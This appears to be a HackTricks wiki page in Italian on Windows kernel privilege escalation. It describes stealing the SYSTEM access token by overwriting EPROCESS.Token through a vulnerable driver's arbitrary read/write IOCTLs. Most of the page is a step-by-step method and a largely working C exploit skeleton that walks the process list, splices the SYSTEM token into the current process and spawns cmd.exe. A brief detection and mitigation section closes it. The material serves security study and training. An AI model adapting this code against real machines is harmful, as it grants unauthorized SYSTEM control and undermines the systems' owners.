# Windows kernel EoP: Token stealing with arbitrary kernel R/W

{{#include ../../banners/hacktricks-training.md}}

## Panoramica

Se un driver vulnerabile espone un IOCTL che fornisce a un attacker primitive di lettura e/o scrittura arbitrary nel kernel, elevare a NT AUTHORITY\SYSTEM può spesso essere ottenuto rubando un SYSTEM access token. La tecnica copia il puntatore Token dall'EPROCESS di un processo SYSTEM nell'EPROCESS del processo corrente.

Perché funziona:
- Ogni processo ha una struttura EPROCESS che contiene (tra gli altri campi) un Token (in realtà un EX_FAST_REF a un oggetto token).
- Il processo SYSTEM (PID 4) possiede un token con tutti i privilegi abilitati.
- Sostituendo l'EPROCESS.Token del processo corrente con il puntatore al token di SYSTEM, il processo corrente verrà eseguito come SYSTEM immediatamente.

> Gli offset in EPROCESS variano tra le versioni di Windows. Determinali dinamicamente (symbols) o usa costanti specifiche per la versione. Ricorda anche che EPROCESS.Token è un EX_FAST_REF (i 3 bit bassi sono flag del reference count).

## Passaggi ad alto livello

1) Individua la base di ntoskrnl.exe e risolvi l'indirizzo di PsInitialSystemProcess.
- Dalla modalità utente, usa NtQuerySystemInformation(SystemModuleInformation) o EnumDeviceDrivers per ottenere le base dei driver caricati.
- Aggiungi l'offset di PsInitialSystemProcess (da symbols/reversing) alla base del kernel per ottenere il suo indirizzo.
2) Leggi il puntatore a PsInitialSystemProcess → questo è un puntatore kernel all'EPROCESS di SYSTEM.
3) Dall'EPROCESS SYSTEM, leggi gli offset UniqueProcessId e ActiveProcessLinks per attraversare la lista doppiamente collegata delle strutture EPROCESS (ActiveProcessLinks.Flink/Blink) finché non trovi l'EPROCESS il cui UniqueProcessId è uguale a GetCurrentProcessId(). Conserva entrambi:
- EPROCESS_SYSTEM (per SYSTEM)
- EPROCESS_SELF (per il processo corrente)
4) Leggi il valore del token di SYSTEM: Token_SYS = *(EPROCESS_SYSTEM + TokenOffset).
- Maschera i 3 bit bassi: Token_SYS_masked = Token_SYS & ~0xF (comunemente ~0xF o ~0x7 a seconda della build; su x64 i 3 bit bassi sono usati — mask 0xFFFFFFFFFFFFFFF8).
5) Opzione A (comune): conserva i 3 bit bassi dal token corrente e incollali sul puntatore di SYSTEM per mantenere coerente il reference count incorporato.
- Token_ME = *(EPROCESS_SELF + TokenOffset)
- Token_NEW = (Token_SYS_masked | (Token_ME & 0x7))
6) Scrivi Token_NEW in (EPROCESS_SELF + TokenOffset) usando la tua primitive di kernel write.
7) Il processo corrente è ora SYSTEM. Facoltativamente avvia un nuovo cmd.exe o powershell.exe per confermare.

## Pseudocode

Di seguito uno scheletro che usa solo due IOCTL di un driver vulnerabile, uno per lettura kernel di 8 byte e uno per scrittura kernel di 8 byte. Sostituisci con l'interfaccia del tuo driver.
```c
#include <Windows.h>
#include <Psapi.h>
#include <stdint.h>

// Device + IOCTLs are driver-specific
#define DEV_PATH   "\\\\.\\VulnDrv"
#define IOCTL_KREAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Version-specific (examples only – resolve per build!)
static const uint32_t Off_EPROCESS_UniquePid    = 0x448; // varies
static const uint32_t Off_EPROCESS_Token        = 0x4b8; // varies
static const uint32_t Off_EPROCESS_ActiveLinks  = 0x448 + 0x8; // often UniquePid+8, varies

BOOL kread_qword(HANDLE h, uint64_t kaddr, uint64_t *out) {
struct { uint64_t addr; } in; struct { uint64_t val; } outb; DWORD ret;
in.addr = kaddr; return DeviceIoControl(h, IOCTL_KREAD, &in, sizeof(in), &outb, sizeof(outb), &ret, NULL) && (*out = outb.val, TRUE);
}
BOOL kwrite_qword(HANDLE h, uint64_t kaddr, uint64_t val) {
struct { uint64_t addr, val; } in; DWORD ret;
in.addr = kaddr; in.val = val; return DeviceIoControl(h, IOCTL_KWRITE, &in, sizeof(in), NULL, 0, &ret, NULL);
}

// Get ntoskrnl base (one option)
uint64_t get_nt_base(void) {
LPVOID drivers[1024]; DWORD cbNeeded;
if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded >= sizeof(LPVOID)) {
return (uint64_t)drivers[0]; // first is typically ntoskrnl
}
return 0;
}

int main(void) {
HANDLE h = CreateFileA(DEV_PATH, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (h == INVALID_HANDLE_VALUE) return 1;

// 1) Resolve PsInitialSystemProcess
uint64_t nt = get_nt_base();
uint64_t PsInitialSystemProcess = nt + /*offset of symbol*/ 0xDEADBEEF; // resolve per build

// 2) Read SYSTEM EPROCESS
uint64_t EPROC_SYS; kread_qword(h, PsInitialSystemProcess, &EPROC_SYS);

// 3) Walk ActiveProcessLinks to find current EPROCESS
DWORD myPid = GetCurrentProcessId();
uint64_t cur = EPROC_SYS; // list is circular
uint64_t EPROC_ME = 0;
do {
uint64_t pid; kread_qword(h, cur + Off_EPROCESS_UniquePid, &pid);
if ((DWORD)pid == myPid) { EPROC_ME = cur; break; }
uint64_t flink; kread_qword(h, cur + Off_EPROCESS_ActiveLinks, &flink);
cur = flink - Off_EPROCESS_ActiveLinks; // CONTAINING_RECORD
} while (cur != EPROC_SYS);

// 4) Read tokens
uint64_t tok_sys, tok_me;
kread_qword(h, EPROC_SYS + Off_EPROCESS_Token, &tok_sys);
kread_qword(h, EPROC_ME  + Off_EPROCESS_Token, &tok_me);

// 5) Mask EX_FAST_REF low bits and splice refcount bits
uint64_t tok_sys_mask = tok_sys & ~0xF; // or ~0x7 on some builds
uint64_t tok_new = tok_sys_mask | (tok_me & 0x7);

// 6) Write back
kwrite_qword(h, EPROC_ME + Off_EPROCESS_Token, tok_new);

// 7) We are SYSTEM now
system("cmd.exe");
return 0;
}
```
Note:
- Offset: Usa WinDbg’s `dt nt!_EPROCESS` con i PDBs del target, o un runtime symbol loader, per ottenere offset corretti. Non hardcodare ciecamente.
- Mask: Su x64 il token è un EX_FAST_REF; i 3 bit meno significativi sono bit del conteggio dei riferimenti. Mantenere i bit bassi originali del tuo token evita inconsistenze immediate nel conteggio dei riferimenti.
- Stability: Preferisci elevare il processo corrente; se elevi un helper di breve durata potresti perdere SYSTEM quando termina.

## Rilevamento e mitigazione
- Il caricamento di driver di terze parti non firmati o non attendibili che espongono potenti IOCTLs è la causa principale.
- Kernel Driver Blocklist (HVCI/CI), DeviceGuard e le regole di Attack Surface Reduction possono impedire il caricamento di driver vulnerabili.
- EDR può monitorare sequenze IOCTL sospette che implementano arbitrary read/write e gli scambi di token.

## Riferimenti
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [FuzzySecurity – Windows Kernel ExploitDev (token stealing examples)](https://www.fuzzysecurity.com/tutorials/expDev/17.html)

{{#include ../../banners/hacktricks-training.md}}
